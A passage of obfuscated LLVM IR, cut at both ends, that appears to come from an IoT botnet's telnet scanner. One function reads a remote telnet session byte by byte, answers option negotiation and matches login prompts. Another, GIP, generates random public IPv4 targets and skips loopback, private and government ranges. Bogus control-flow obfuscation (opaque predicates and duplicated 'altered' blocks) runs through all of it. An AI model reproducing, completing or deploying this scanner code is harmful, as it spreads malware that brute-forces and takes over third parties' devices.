  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %93
  %102 = load i8*, i8** %15, align 8
  %103 = load i32, i32* %18, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %102, i64 %104
  store i8* %105, i8** %23, align 8
  %106 = load i32, i32* %10, align 4
  %107 = load i8*, i8** %23, align 8
  %108 = call i64 @recv(i32 %106, i8* %107, i64 1, i32 0)
  %109 = trunc i64 %108 to i32
  store i32 %109, i32* %19, align 4
  %110 = load i32, i32* %19, align 4
  %111 = icmp eq i32 %110, -1
  %112 = load i32, i32* @x.69
  %113 = load i32, i32* @y.70
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %111, label %123, label %120

; <label>:120:                                    ; preds = %originalBBpart216
  %121 = load i32, i32* %19, align 4
  %122 = icmp eq i32 %121, 0
  br i1 %122, label %123, label %124

; <label>:123:                                    ; preds = %120, %originalBBpart216
  store i32 0, i32* %9, align 4
  br label %238

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* %19, align 4
  %126 = load i32, i32* %18, align 4
  %127 = add nsw i32 %126, %125
  store i32 %127, i32* %18, align 4
  %128 = load i8*, i8** %23, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 255
  br i1 %131, label %132, label %170

; <label>:132:                                    ; preds = %124
  %133 = load i32, i32* %10, align 4
  %134 = load i8*, i8** %23, align 8
  %135 = getelementptr inbounds i8, i8* %134, i64 1
  %136 = call i64 @recv(i32 %133, i8* %135, i64 2, i32 0)
  %137 = trunc i64 %136 to i32
  store i32 %137, i32* %19, align 4
  %138 = load i32, i32* %19, align 4
  %139 = icmp eq i32 %138, -1
  br i1 %139, label %159, label %140

; <label>:140:                                    ; preds = %132
  %141 = load i32, i32* @x.69
  %142 = load i32, i32* @y.70
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %140
  %149 = load i32, i32* %19, align 4
  %150 = icmp eq i32 %149, 0
  %151 = load i32, i32* @x.69
  %152 = load i32, i32* @y.70
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %150, label %159, label %160

; <label>:159:                                    ; preds = %originalBBpart220, %132
  store i32 0, i32* %9, align 4
  br label %238

; <label>:160:                                    ; preds = %originalBBpart220
  %161 = load i32, i32* %19, align 4
  %162 = load i32, i32* %18, align 4
  %163 = add nsw i32 %162, %161
  store i32 %163, i32* %18, align 4
  %164 = load i32, i32* %10, align 4
  %165 = load i8*, i8** %23, align 8
  %166 = call i32 @negotiate(i32 %164, i8* %165, i32 3)
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %169, label %168

; <label>:168:                                    ; preds = %160
  store i32 0, i32* %9, align 4
  br label %238

; <label>:169:                                    ; preds = %160
  br label %200

; <label>:170:                                    ; preds = %124
  %171 = load i8*, i8** %15, align 8
  %172 = load i8*, i8** %11, align 8
  %173 = call i8* @strstr(i8* %171, i8* %172) #9
  %174 = icmp ne i8* %173, null
  br i1 %174, label %198, label %175

; <label>:175:                                    ; preds = %170
  %176 = load i32, i32* %12, align 4
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %178, label %199

; <label>:178:                                    ; preds = %175
  %179 = load i32, i32* @x.69
  %180 = load i32, i32* @y.70
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %178
  %187 = load i8*, i8** %15, align 8
  %188 = call i32 @matchPrompt(i8* %187)
  %189 = icmp ne i32 %188, 0
  %190 = load i32, i32* @x.69
  %191 = load i32, i32* @y.70
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %189, label %198, label %199

; <label>:198:                                    ; preds = %originalBBpart224, %170
  store i32 1, i32* %20, align 4
  br label %217

; <label>:199:                                    ; preds = %originalBBpart224, %175
  br label %200

; <label>:200:                                    ; preds = %199, %169
  %201 = load i32, i32* @x.69
  %202 = load i32, i32* @y.70
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %200
  %209 = load i32, i32* @x.69
  %210 = load i32, i32* @y.70
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %33

; <label>:217:                                    ; preds = %198, %92, %64
  %218 = load i32, i32* %20, align 4
  %219 = icmp ne i32 %218, 0
  br i1 %219, label %220, label %221

; <label>:220:                                    ; preds = %217
  store i32 1, i32* %9, align 4
  br label %238

; <label>:221:                                    ; preds = %217
  %222 = load i32, i32* @x.69
  %223 = load i32, i32* @y.70
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %221
  store i32 0, i32* %9, align 4
  %230 = load i32, i32* @x.69
  %231 = load i32, i32* @y.70
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %238

; <label>:238:                                    ; preds = %originalBBpart232, %220, %168, %159, %123
  %239 = load i32, i32* @x.69
  %240 = load i32, i32* @y.70
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %238
  %247 = load i32, i32* %9, align 4
  %248 = load i32, i32* @x.69
  %249 = load i32, i32* @y.70
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  ret i32 %247

originalBBalteredBB:                              ; preds = %originalBB, %33
  %256 = load i32, i32* %18, align 4
  %_ = shl i32 %256, 2
  %_1 = sub i32 %256, 2
  %gen = mul i32 %_1, 2
  %_2 = sub i32 0, %256
  %gen3 = add i32 %_2, 2
  %_4 = sub i32 %256, 2
  %gen5 = mul i32 %_4, 2
  %_6 = sub i32 %256, 2
  %gen7 = mul i32 %_6, 2
  %_8 = sub i32 %256, 2
  %gen9 = mul i32 %_8, 2
  %_10 = sub i32 %256, 2
  %gen11 = mul i32 %_10, 2
  %_12 = shl i32 %256, 2
  %_13 = shl i32 %256, 2
  %257 = add nsw i32 %256, 2
  %258 = load i32, i32* %16, align 4
  %259 = icmp slt i32 %257, %258
  br label %originalBB

originalBB14alteredBB:                            ; preds = %originalBB14, %93
  %260 = load i8*, i8** %15, align 8
  %261 = load i32, i32* %18, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds i8, i8* %260, i64 %262
  store i8* %263, i8** %23, align 8
  %264 = load i32, i32* %10, align 4
  %265 = load i8*, i8** %23, align 8
  %266 = call i64 @recv(i32 %264, i8* %265, i64 1, i32 0)
  %267 = trunc i64 %266 to i32
  store i32 %267, i32* %19, align 4
  %268 = load i32, i32* %19, align 4
  %269 = icmp eq i32 %268, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %140
  %270 = load i32, i32* %19, align 4
  %271 = icmp eq i32 %270, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %178
  %272 = load i8*, i8** %15, align 8
  %273 = call i32 @matchPrompt(i8* %272)
  %274 = icmp ne i32 %273, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %200
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %221
  store i32 0, i32* %9, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %238
  %275 = load i32, i32* %9, align 4
  br label %originalBB34
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @GIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #3
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #3
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #3
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #3
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %5060, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %5042, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i32, i32* @x.71
  %20 = load i32, i32* @y.72
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 0
  %30 = load i32, i32* @x.71
  %31 = load i32, i32* @y.72
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %5042, label %38

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 3
  br i1 %41, label %5042, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 15
  br i1 %45, label %5042, label %46

; <label>:46:                                     ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 56
  br i1 %49, label %5042, label %50

; <label>:50:                                     ; preds = %46
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 10
  br i1 %53, label %5042, label %54

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 25
  br i1 %57, label %5042, label %58

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 49
  br i1 %61, label %5042, label %62

; <label>:62:                                     ; preds = %58
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 50
  br i1 %65, label %5042, label %66

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* @x.71
  %68 = load i32, i32* @y.72
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 137
  %78 = load i32, i32* @x.71
  %79 = load i32, i32* @y.72
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %77, label %5042, label %86

; <label>:86:                                     ; preds = %originalBBpart24
  %87 = load i32, i32* @x.71
  %88 = load i32, i32* @y.72
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 6
  %98 = load i32, i32* @x.71
  %99 = load i32, i32* @y.72
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %97, label %5042, label %106

; <label>:106:                                    ; preds = %originalBBpart28
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 7
  br i1 %109, label %5042, label %110

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 11
  br i1 %113, label %5042, label %114

; <label>:114:                                    ; preds = %110
  %115 = load i32, i32* @x.71
  %116 = load i32, i32* @y.72
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %114
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 21
  %126 = load i32, i32* @x.71
  %127 = load i32, i32* @y.72
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %125, label %5042, label %134

; <label>:134:                                    ; preds = %originalBBpart212
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 22
  br i1 %137, label %5042, label %138

; <label>:138:                                    ; preds = %134
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 26
  br i1 %141, label %5042, label %142

; <label>:142:                                    ; preds = %138
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 28
  br i1 %145, label %5042, label %146

; <label>:146:                                    ; preds = %142
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 29
  br i1 %149, label %5042, label %150

; <label>:150:                                    ; preds = %146
  %151 = load i32, i32* @x.71
  %152 = load i32, i32* @y.72
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %150
  %159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %160 = zext i8 %159 to i32
  %161 = icmp eq i32 %160, 30
  %162 = load i32, i32* @x.71
  %163 = load i32, i32* @y.72
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %161, label %5042, label %170

; <label>:170:                                    ; preds = %originalBBpart216
  %171 = load i32, i32* @x.71
  %172 = load i32, i32* @y.72
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %170
  %179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %180 = zext i8 %179 to i32
  %181 = icmp eq i32 %180, 33
  %182 = load i32, i32* @x.71
  %183 = load i32, i32* @y.72
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %181, label %5042, label %190

; <label>:190:                                    ; preds = %originalBBpart220
  %191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 55
  br i1 %193, label %5042, label %194

; <label>:194:                                    ; preds = %190
  %195 = load i32, i32* @x.71
  %196 = load i32, i32* @y.72
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %194
  %203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %204 = zext i8 %203 to i32
  %205 = icmp eq i32 %204, 214
  %206 = load i32, i32* @x.71
  %207 = load i32, i32* @y.72
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %205, label %5042, label %214

; <label>:214:                                    ; preds = %originalBBpart224
  %215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 215
  br i1 %217, label %5042, label %218

; <label>:218:                                    ; preds = %214
  %219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %220 = zext i8 %219 to i32
  %221 = icmp eq i32 %220, 192
  br i1 %221, label %222, label %226

; <label>:222:                                    ; preds = %218
  %223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 168
  br i1 %225, label %5042, label %226

; <label>:226:                                    ; preds = %222, %218
  %227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %228 = zext i8 %227 to i32
  %229 = icmp eq i32 %228, 146
  br i1 %229, label %230, label %234

; <label>:230:                                    ; preds = %226
  %231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %232 = zext i8 %231 to i32
  %233 = icmp eq i32 %232, 17
  br i1 %233, label %5042, label %234

; <label>:234:                                    ; preds = %230, %226
  %235 = load i32, i32* @x.71
  %236 = load i32, i32* @y.72
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %234
  %243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %244 = zext i8 %243 to i32
  %245 = icmp eq i32 %244, 146
  %246 = load i32, i32* @x.71
  %247 = load i32, i32* @y.72
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %245, label %254, label %258

; <label>:254:                                    ; preds = %originalBBpart228
  %255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 80
  br i1 %257, label %5042, label %258

; <label>:258:                                    ; preds = %254, %originalBBpart228
  %259 = load i32, i32* @x.71
  %260 = load i32, i32* @y.72
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %258
  %267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %268 = zext i8 %267 to i32
  %269 = icmp eq i32 %268, 146
  %270 = load i32, i32* @x.71
  %271 = load i32, i32* @y.72
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %269, label %278, label %282

; <label>:278:                                    ; preds = %originalBBpart232
  %279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 98
  br i1 %281, label %5042, label %282

; <label>:282:                                    ; preds = %278, %originalBBpart232
  %283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %284 = zext i8 %283 to i32
  %285 = icmp eq i32 %284, 146
  br i1 %285, label %286, label %290

; <label>:286:                                    ; preds = %282
  %287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %288 = zext i8 %287 to i32
  %289 = icmp eq i32 %288, 154
  br i1 %289, label %5042, label %290

; <label>:290:                                    ; preds = %286, %282
  %291 = load i32, i32* @x.71
  %292 = load i32, i32* @y.72
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %290
  %299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 147
  %302 = load i32, i32* @x.71
  %303 = load i32, i32* @y.72
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %301, label %310, label %330

; <label>:310:                                    ; preds = %originalBBpart236
  %311 = load i32, i32* @x.71
  %312 = load i32, i32* @y.72
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %310
  %319 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %320 = zext i8 %319 to i32
  %321 = icmp eq i32 %320, 159
  %322 = load i32, i32* @x.71
  %323 = load i32, i32* @y.72
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %321, label %5042, label %330

; <label>:330:                                    ; preds = %originalBBpart240, %originalBBpart236
  %331 = load i32, i32* @x.71
  %332 = load i32, i32* @y.72
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %330
  %339 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %340 = zext i8 %339 to i32
  %341 = icmp eq i32 %340, 148
  %342 = load i32, i32* @x.71
  %343 = load i32, i32* @y.72
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %341, label %350, label %370

; <label>:350:                                    ; preds = %originalBBpart244
  %351 = load i32, i32* @x.71
  %352 = load i32, i32* @y.72
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
